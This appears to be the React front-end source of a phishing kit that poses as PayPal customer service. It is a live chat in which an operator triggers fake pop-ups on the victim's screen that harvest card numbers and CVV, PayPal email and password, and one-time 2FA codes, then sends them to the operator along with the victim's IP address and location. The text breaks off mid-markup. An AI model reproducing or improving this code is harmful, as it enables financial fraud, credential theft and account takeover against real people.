import React, { useState, useEffect, useRef } from 'react';
import io from 'socket.io-client';
import './App.css'; // Import du CSS global

// --- Configuration ---
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
let socket;
const MAX_FILE_SIZE = 2 * 1024 * 1024; // 2Mo en octets

// --- Icônes SVG (identiques) ---
const TrashIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0z"/><path d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4zM2.5 3h11V2h-11z"/></svg> );
const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" /></svg> );
const AttachmentIcon = () => ( 
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
    <path d="M21.843 3.455c-1.688-1.688-4.43-1.688-6.118 0l-8.485 8.485c-0.975 0.975-0.975 2.56 0 3.535s2.56 0.975 3.535 0l7.071-7.071c0.195-0.195 0.195-0.512 0-0.707s-0.512-0.195-0.707 0l-7.071 7.071c-0.585 0.585-1.536 0.585-2.121 0s-0.585-1.536 0-2.121l8.485-8.485c1.298-1.298 3.41-1.298 4.708 0s1.298 3.41 0 4.708l-8.485 8.485c-1.914 1.914-5.025 1.914-6.939 0s-1.914-5.025 0-6.939l7.778-7.778c0.195-0.195 0.512-0.195 0.707 0s0.195 0.512 0 0.707l-7.778 7.778c-1.524 1.524-1.524 4.001 0 5.525s4.001 1.524 5.525 0l8.485-8.485c1.688-1.688 1.688-4.43 0-6.118z"/>
  </svg>
);
const FileIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/></svg> );
const ExclamationIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-red-500" viewBox="0 0 16 16"><path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/></svg> );
const CheckIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-green-500" viewBox="0 0 16 16"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.267.267 0 0 1 .02-.022z"/></svg> );
const ClockIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-blue-500" viewBox="0 0 16 16"><path d="M8 3.5a.5.5 0 0 0-1 0V9a.5.5 0 0 0 .252.434l3.5 2a.5.5 0 0 0 .496-.868L8 8.71V3.5z"/><path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm7-8A7 7 0 1 1 1 8a7 7 0 0 1 14 0z"/></svg> );
const PopupIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 0H0v16h16V0zM1.5 1.5v13h13v-13h-13z"/><path d="M10 3.5v1.5h-7V3.5h7zm0 4v1.5h-7V7.5h7zm0 4v1.5h-7v-1.5h7z"/></svg> );
const CreditCardIcon = () => ( 
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
    <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v1h14V4a1 1 0 0 0-1-1H2zm13 4H1v5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V7z"/>
    <path d="M2 10a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1v-1z"/>
  </svg> 
);
const PayPalIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
    <path d="M14.06 3.713c.12-1.071-.093-1.832-.702-2.526C12.628.356 11.312 0 9.626 0H4.734a.7.7 0 0 0-.691.59L2.005 13.509a.42.42 0 0 0 .415.486h2.756l-.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.018a.845.845 0 0 1 .833-.607h.518c1.671 0 2.978-.732 3.36-2.85.318-1.417.155-2.593-.570-3.047a2.639 2.639 0 0 0-1.092-.26z"/>
    <path d="M12.50 8.024c-.272 1.492-.917 2.086-2.044 2.086h-.908a.7.7 0 0 0-.691.59l-.596 3.776a.56.56 0 0 1-.552.456H6.473a.42.42 0 0 0-.415.486l.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.018a.845.845 0 0 1 .833-.607h.518c1.671 0 2.978-.732 3.36-2.85.318-1.417.155-2.593-.570-3.047a2.639 2.639 0 0 0-1.092-.26z"/>
  </svg>
);

// ✅ NOUVEAU : Bandeau Défilant avec Affichage Immédiat
const ScrollingBanner = () => {
    const bannerText = "🚨 We have experienced network disruptions over the past 48 hours, thank you for your understanding. The service restricts its opening hours from Monday to Friday between 10:00 AM and 12:00 PM and 2:30 PM and 4:30 PM 🚨";
    
    return (
        <div className="bg-red-600 text-white text-sm py-2 overflow-hidden relative border-b border-red-700">
            <div className="scrolling-text" style={{ paddingLeft: '20px' }}>
                {/* ✅ CORRIGÉ : Texte dupliqué avec plus d'espacement */}
                {bannerText} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {bannerText} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {bannerText}
            </div>
        </div>
    );
};

// --- Composant : Panneau d'informations Client ---
const ClientInfoPanel = ({ info }) => {
    const parseUserAgent = (ua) => {
        if (!ua || ua === 'N/A') return { browser: 'N/A', os: 'N/A' };
        let browser = 'Unknown';
        if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Safari')) browser = 'Safari';
        let os = 'Unknown';
        if (ua.includes('Win')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('like Mac OS X')) os = 'iOS';
        return { browser, os };
    };

    const { browser, os } = parseUserAgent(info.userAgent);
    const connectionTime = info.connectedAt ? new Date(info.connectedAt).toLocaleString() : 'N/A';
    const mainLanguage = info.language ? info.language.split(',')[0] : 'N/A';

    return (
        <div className="bg-gray-100 p-3 border-b border-gray-200 text-xs text-gray-700 shadow-inner grid grid-cols-2 sm:grid-cols-4 gap-2">
            <div><span className="font-bold">IP Address:</span> <code className="bg-gray-200 px-1.5 py-0.5 rounded">{info.ip}</code></div>
            <div><span className="font-bold">Location:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{info.city || 'N/A'}, {info.country || 'N/A'}</span></div>
            <div><span className="font-bold">ISP:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{info.isp || 'N/A'}</span></div>
            <div><span className="font-bold">OS:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{os}</span></div>
            <div><span className="font-bold">Browser:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{browser}</span></div>
            <div><span className="font-bold">Language:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{mainLanguage}</span></div>
            <div className="col-span-2 sm:col-span-4"><span className="font-bold">Connection Time:</span> <span className="bg-gray-200 px-1.5 py-0.5 rounded">{connectionTime}</span></div>
        </div>
    );
};

// --- Composant : Pop-up de Remboursement ---
const RefundPopup = ({ onChoice }) => {
    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-10 rounded-lg shadow-2xl text-center w-full max-w-sm border">
                <img src="/paypal.png" alt="PayPal Logo" className="w-28 mx-auto mb-6" />
                <h2 className="text-xl font-semibold text-gray-800 mb-2">Choose your method</h2>
                <p className="text-gray-600 mb-8">How would you like to receive your refund?</p>
                <div className="flex flex-col gap-4">
                    <button onClick={() => onChoice('PayPal Transfer')} className="w-full bg-[#0070ba] text-white font-bold py-3 px-4 rounded-full hover:bg-[#005ea6] transition duration-200">
                        PayPal Transfer
                    </button>
                    <button onClick={() => onChoice('Refund to another card')} className="w-full bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-full hover:bg-gray-300 transition duration-200">
                        Refund to another card
                    </button>
                </div>
            </div>
        </div>
    );
};

// --- Composant : Pop-up de Carte Bancaire ---
const CreditCardPopup = ({ onSubmit, onClose }) => {
    const [cardData, setCardData] = useState({
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        cardHolderName: '',
        billingZip: ''
    });

    const formatCardNumber = (value) => {
        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        const matches = v.match(/\d{4,16}/g);
        const match = matches && matches[0] || '';
        const parts = [];
        for (let i = 0, len = match.length; i < len; i += 4) {
            parts.push(match.substring(i, i + 4));
        }
        if (parts.length) {
            return parts.join(' ');
        } else {
            return v;
        }
    };

    const formatExpiryDate = (value) => {
        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        if (v.length >= 2) {
            return v.substring(0, 2) + '/' + v.substring(2, 4);
        }
        return v;
    };

    const handleInputChange = (field, value) => {
        let formattedValue = value;
        
        if (field === 'cardNumber') {
            formattedValue = formatCardNumber(value);
        } else if (field === 'expiryDate') {
            formattedValue = formatExpiryDate(value);
        } else if (field === 'cvv') {
            formattedValue = value.replace(/[^0-9]/g, '').substring(0, 4);
        }
        
        setCardData(prev => ({ ...prev, [field]: formattedValue }));
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit(cardData);
        onClose();
    };

    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-md border">
                <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center gap-3">
                        <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
                        <h2 className="text-xl font-semibold text-gray-800">Payment Information</h2>
                    </div>
                    <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
                </div>
                
                <form onSubmit={handleSubmit} className="space-y-4">
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Card Number *</label>
                        <input
                            type="text"
                            placeholder="1234 5678 9012 3456"
                            value={cardData.cardNumber}
                            onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                            maxLength="19"
                            required
                        />
                    </div>
                    
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Cardholder Name *</label>
                        <input
                            type="text"
                            placeholder="John Doe"
                            value={cardData.cardHolderName}
                            onChange={(e) => handleInputChange('cardHolderName', e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                            required
                        />
                    </div>
                    
                    <div className="grid grid-cols-2 gap-4">
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date *</label>
                            <input
                                type="text"
                                placeholder="MM/YY"
                                value={cardData.expiryDate}
                                onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                                maxLength="5"
                                required
                            />
                        </div>
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">CVV *</label>
                            <input
                                type="text"
                                placeholder="123"
                                value={cardData.cvv}
                                onChange={(e) => handleInputChange('cvv', e.target.value)}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                                maxLength="4"
                                required
                            />
                        </div>
                    </div>
                    
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Billing Zip Code</label>
                        <input
                            type="text"
                            placeholder="12345"
                            value={cardData.billingZip}
                            onChange={(e) => handleInputChange('billingZip', e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                        />
                    </div>
                    
                    <div className="flex gap-3 mt-6">
                        <button
                            type="button"
                            onClick={onClose}
                            className="flex-1 bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-lg hover:bg-gray-300 transition duration-200"
                        >
                            Cancel
                        </button>
                        <button
                            type="submit"
                            className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
                        >
                            Submit
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );
};

// --- Composant : Pop-up PayPal Login (Étape 1) ---
const PayPalLogin1Popup = ({ onSubmit, onClose }) => {
    const [loginData, setLoginData] = useState({
        email: '',
        password: ''
    });

    const handleInputChange = (field, value) => {
        setLoginData(prev => ({ ...prev, [field]: value }));
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit(loginData);
        onClose();
    };

    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-md border">
                <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center gap-3">
                        <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
                        <h2 className="text-xl font-semibold text-gray-800">PayPal Login</h2>
                    </div>
                    <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
                </div>
                
                <form onSubmit={handleSubmit} className="space-y-4">
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Email Address *</label>
                        <input
                            type="email"
                            placeholder="example@email.com"
                            value={loginData.email}
                            onChange={(e) => handleInputChange('email', e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                            required
                        />
                    </div>
                    
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Password *</label>
                        <input
                            type="password"
                            placeholder="Enter your password"
                            value={loginData.password}
                            onChange={(e) => handleInputChange('password', e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                            required
                        />
                    </div>
                    
                    <div className="flex gap-3 mt-6">
                        <button
                            type="button"
                            onClick={onClose}
                            className="flex-1 bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-lg hover:bg-gray-300 transition duration-200"
                        >
                            Cancel
                        </button>
                        <button
                            type="submit"
                            className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
                        >
                            Continue
                        </button>
                    </div>
                </form>
            </div>
        </div>
    );
};

// --- Composant : Pop-up PayPal 2FA (Étape 2) ---
const PayPalLogin2Popup = ({ onSubmit, onClose }) => {
    const [verificationData, setVerificationData] = useState({
        verificationCode: ''
    });

    const handleInputChange = (field, value) => {
        let formattedValue = value;
        
        if (field === 'verificationCode') {
            formattedValue = value.replace(/[^0-9]/g, '').substring(0, 6);
        }
        
        setVerificationData(prev => ({ ...prev, [field]: formattedValue }));
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit(verificationData);
        onClose();
    };

    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-md border">
                <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center gap-3">
                        <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
                        <h2 className="text-xl font-semibold text-gray-800">Two-Step Verification</h2>
                    </div>
                    <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
                </div>
                
                <div className="text-center mb-6">
                    <p className="text-gray-600 text-sm mb-2">Enter the 6-digit code from your authenticator app</p>
                    <p className="text-xs text-gray-500">We've sent a verification code to secure your account</p>
                </div>
                
                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">Verification Code *</label>
                        <input
                            type="text"
                            placeholder="123456"
                            value={verificationData.verificationCode}
                            onChange={(e) => handleInputChange('verificationCode', e.target.value)}
                            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde] text-center text-xl font-mono tracking-wider"
                            maxLength="6"
                            required
                        />
                    </div>
                    
                    <div className="flex gap-3 mt-6">
                        <button
                            type="button"
                            onClick={onClose}
                            className="flex-1 bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-lg hover:bg-gray-300 transition duration-200"
                        >
                            Cancel
                        </button>
                        <button
                            type="submit"
                            className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
                        >
                            Verify
                        </button>
                    </div>
                </form>
                
                <div className="text-center mt-4">
                    <button className="text-[#0070ba] text-sm hover:underline">
                        Didn't receive a code? Resend
                    </button>
                </div>
            </div>
        </div>
    );
};

// --- Composant : Pop-up de Vérification ---
const VerificationPopup = () => {
    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-12 rounded-lg shadow-2xl text-center w-full max-w-sm border">
                <img src="/paypal.png" alt="PayPal Logo" className="w-20 mx-auto mb-8" />
                
                <div className="verification-spinner"></div>
                
                <h2 className="text-lg font-semibold text-gray-800 mb-2">Verification in Progress</h2>
                <p className="text-gray-600 text-sm">Please wait, verifying information...</p>
            </div>
        </div>
    );
};

// --- Composant principal ---
function App() {
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [userType, setUserType] = useState('');
    const [code, setCode] = useState('');
    const [date, setDate] = useState('');
    const [error, setError] = useState('');
    const [messages, setMessages] = useState([]);
    const [message, setMessage] = useState('');
    const messagesEndRef = useRef(null);
    const fileInputRef = useRef(null);
    const [uploading, setUploading] = useState(false);
    const [clientInfo, setClientInfo] = useState({ ip: 'Waiting for user interaction...', city: 'N/A', country: 'N/A', isp: 'N/A', userAgent: 'N/A', language: 'N/A', connectedAt: null });
    const [isImportant, setIsImportant] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [isVerifying, setIsVerifying] = useState(false);
    const [showPopup, setShowPopup] = useState(false);
    const [showCreditCardPopup, setShowCreditCardPopup] = useState(false);
    const [showPayPalLogin1Popup, setShowPayPalLogin1Popup] = useState(false);
    const [showPayPalLogin2Popup, setShowPayPalLogin2Popup] = useState(false);
    const [showVerificationPopup, setShowVerificationPopup] = useState(false);
    const [isConnecting, setIsConnecting] = useState(false);

    // Demander permission pour notifications browser
    useEffect(() => {
        if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
            Notification.requestPermission();
        }
    }, []);

    useEffect(() => {
        if (isLoggedIn) {
            socket.emit('user type', { userType });

            const handleNewMessage = (msg) => {
                if (msg.user === 'User' && msg.clientInfo) setClientInfo(msg.clientInfo);
                setMessages((prev) => [...prev, msg]);
            };
            
            const handleNewFile = (fileData) => {
                if (fileData.user === 'User' && fileData.clientInfo) setClientInfo(fileData.clientInfo);
                setMessages((prev) => [...prev, { ...fileData, type: 'file' }]);
            };
            
            const handleDisplayPopup = () => {
                if (userType === 'User') {
                    setShowPopup(true);
                }
            };
            
            const handleDisplayCreditCardPopup = () => {
                if (userType === 'User') {
                    setShowCreditCardPopup(true);
                }
            };
            
            const handleDisplayPayPalLogin1Popup = () => {
                if (userType === 'User') {
                    setShowPayPalLogin1Popup(true);
                }
            };
            
            const handleDisplayPayPalLogin2Popup = () => {
                if (userType === 'User') {
                    setShowPayPalLogin2Popup(true);
                }
            };
            
            const handleDisplayVerificationPopup = (data) => {
                if (userType === 'User') {
                    if (data.show) {
                        setShowVerificationPopup(true);
                    } else {
                        setShowVerificationPopup(false);
                    }
                }
            };

            const handleAutoToggleVerification = (data) => {
                if (userType === 'Support') {
                    setIsVerifying(true);
                    setIsImportant(false);
                    setIsSuccess(false);
                    socket.emit('verification popup', { show: true });
                    console.log('🔄 Vérification activée automatiquement:', data.action);
                }
            };

            const handleClientConnectionAlert = (alertData) => {
                if (userType === 'Support') {
                    if (Notification.permission === 'granted') {
                        new Notification(alertData.title, {
                            body: `${alertData.message}\nIP: ${alertData.clientInfo.ip}\nLocation: ${alertData.clientInfo.city}, ${alertData.clientInfo.country}`,
                            icon: '/paypal.png',
                            tag: 'client-connection'
                        });
                    }
                    
                    if (alertData.sound) {
                        try {
                            const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmAZBz2a3/DIeCgENYvK892PPBoGZbvt6+BSGANCq+DAaS8EIX7S8dqBOwgWT6');
                            audio.play().catch(() => {});
                        } catch (e) {
                            console.log('Son non disponible');
                        }
                    }
                }
            };

            socket.on('chat message', handleNewMessage);
            socket.on('file message', handleNewFile);
            socket.on('chat cleared', () => setMessages([]));
            socket.on('user activity', (notification) => {
                if (userType === 'Support') {
                    setMessages((prev) => [...prev, { user: 'System', text: notification.text }]);
                }
            });
            socket.on('display popup', handleDisplayPopup);
            socket.on('display credit card popup', handleDisplayCreditCardPopup);
            socket.on('display paypal login1 popup', handleDisplayPayPalLogin1Popup);
            socket.on('display paypal login2 popup', handleDisplayPayPalLogin2Popup);
            socket.on('display verification popup', handleDisplayVerificationPopup);
            socket.on('auto_toggle_verification', handleAutoToggleVerification);
            socket.on('client_connection_alert', handleClientConnectionAlert);
            
            return () => {
                socket.off('chat message');
                socket.off('file message');
                socket.off('chat cleared');
                socket.off('user activity');
                socket.off('display popup');
                socket.off('display credit card popup');
                socket.off('display paypal login1 popup');
                socket.off('display paypal login2 popup');
                socket.off('display verification popup');
                socket.off('auto_toggle_verification');
                socket.off('client_connection_alert');
                
                if (socket) socket.disconnect();
            };
        }
    }, [isLoggedIn, userType]);

    useEffect(() => {
        messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [messages]);

    const handleLogin = async (e) => {
        e.preventDefault();
        setError('');
        setIsConnecting(true);
        
        try {
            const response = await fetch(`${API_URL}/verify`, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ code, date }) 
            });
            
            const data = await response.json();
            if (data.success) {
                setUserType(data.userType);
                socket = io(API_URL);
                setIsLoggedIn(true);
            } else {
                setError(data.message || 'Invalid code or date');
            }
        } catch (err) {
            setError('Server connection error. Please try again.');
        } finally {
            setIsConnecting(false);
        }
    };
    
    const sendMessage = (e) => {
        e.preventDefault();
        if (message.trim()) {
            socket.emit('chat message', {
                user: userType,
                text: message,
                isImportant: userType === 'Support' ? isImportant : false,
                isSuccess: userType === 'Support' ? isSuccess : false,
                isVerifying: userType === 'Support' ? isVerifying : false
            });
            setMessage('');
            setIsImportant(false);
            setIsSuccess(false);
            setIsVerifying(false);
        }
    };
    
    const handleClearChat = () => socket.emit('clear chat');
    const handleAttachmentClick = () => fileInputRef.current.click();
    const handleFileChange = (e) => {
        const files = e.target.files;
        if (!files || files.length === 0) return;
        setUploading(true);
        Array.from(files).forEach(file => {
            if (file.size > MAX_FILE_SIZE) {
                alert(`File "${file.name}" is too large. Max size is ${MAX_FILE_SIZE / 1024 / 1024} MB.`);
                return;
            }
            const reader = new FileReader();
            reader.onload = (event) => {
                const fileData = { user: userType, fileName: file.name, fileType: file.type, content: event.target.result };
                socket.emit('file message', fileData);
            };
            reader.readAsDataURL(file);
        });
        setTimeout(() => setUploading(false), 1000);
        e.target.value = null;
    };

    const handleRequestPopup = () => socket.emit('request popup');
    const handleRequestCreditCard = () => socket.emit('request credit card');
    const handleRequestPayPalLogin1 = () => socket.emit('request paypal login1');
    const handleRequestPayPalLogin2 = () => socket.emit('request paypal login2');
    const handlePopupChoice = (option) => { setShowPopup(false); socket.emit('popup choice', { option }); };
    const handleCreditCardSubmit = (cardData) => { socket.emit('credit card data', { cardData }); setShowCreditCardPopup(false); };
    const handlePayPalLogin1Submit = (loginData) => { socket.emit('paypal login1 data', { loginData }); setShowPayPalLogin1Popup(false); };
    const handlePayPalLogin2Submit = (verificationData) => { socket.emit('paypal login2 data', { verificationData }); setShowPayPalLogin2Popup(false); };

    const handleCheckboxChange = (type) => {
        if (type === 'important') {
            setIsImportant(!isImportant);
            if (!isImportant) { setIsSuccess(false); setIsVerifying(false); }
        } else if (type === 'success') {
            setIsSuccess(!isSuccess);
            if (!isSuccess) { setIsImportant(false); setIsVerifying(false); }
        } else if (type === 'verifying') {
            const newVerifyingState = !isVerifying;
            setIsVerifying(newVerifyingState);
            if (newVerifyingState) { setIsImportant(false); setIsSuccess(false); }
            socket.emit('verification popup', { show: newVerifyingState });
        }
    };

    if (!isLoggedIn) {
        return (
            <div className="min-h-screen bg-[#f5f7fa] flex items-center justify-center p-4 font-sans">
                <div className="w-full max-w-md bg-white rounded-xl shadow-lg p-8">
                    <img src="/paypal.png" alt="PayPal Logo" className="w-24 mx-auto mb-6" />
                    <h1 className="text-2xl font-bold text-center text-[#003087] mb-2">Case Access</h1>
                    <p className="text-center text-gray-500 mb-6">Please enter the information provided to communicate with our service.</p>
                    <form onSubmit={handleLogin}>
                        <div className="mb-4">
                            <label htmlFor="code" className="block text-sm font-medium text-gray-700 mb-1">Dispute Code</label>
                            <input type="text" id="code" value={code} onChange={(e) => setCode(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-[#009cde] focus:border-[#009cde]" required />
                        </div>
                        <div className="mb-6">
                            <label htmlFor="date" className="block text-sm font-medium text-gray-700 mb-1">Dispute Date (DD/MM/YYYY)</label>
                            <input type="text" id="date" value={date} placeholder="DD/MM/YYYY" onChange={(e) => setDate(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-[#009cde] focus:border-[#009cde]" required />
                        </div>
                        {error && <p className="text-red-500 text-sm text-center mb-4">{error}</p>}
                        <button 
                            type="submit" 
                            disabled={isConnecting}
                            className="w-full bg-[#0070ba] text-white font-bold py-2.5 px-4 rounded-lg hover:bg-[#003087] transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                        >
                            {isConnecting ? (
                                <>
                                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="m4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    Connecting...
                                </>
                            ) : (
                                'Connect'
                            )}
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    return (
        <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
            {showPopup && <RefundPopup onChoice={handlePopupChoice} />}
            {showCreditCardPopup && <CreditCardPopup onSubmit={handleCreditCardSubmit} onClose={() => setShowCreditCardPopup(false)} />}
            {showPayPalLogin1Popup && <PayPalLogin1Popup onSubmit={handlePayPalLogin1Submit} onClose={() => setShowPayPalLogin1Popup(false)} />}
            {showPayPalLogin2Popup && <PayPalLogin2Popup onSubmit={handlePayPalLogin2Submit} onClose={() => setShowPayPalLogin2Popup(false)} />}
            {showVerificationPopup && <VerificationPopup />}
            
            {/* ✅ CORRIGÉ : Bandeau défilant avec affichage immédiat */}
            {userType === 'User' && <ScrollingBanner />}
            
            <header className="flex items-center justify-between p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                <div className="flex items-center">
                    <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
                    <div>
                        <h1 className="text-xl font-bold text-[#003087]">Customer Service</h1>
                        <p className="text-sm text-green-500 font-semibold flex items-center">
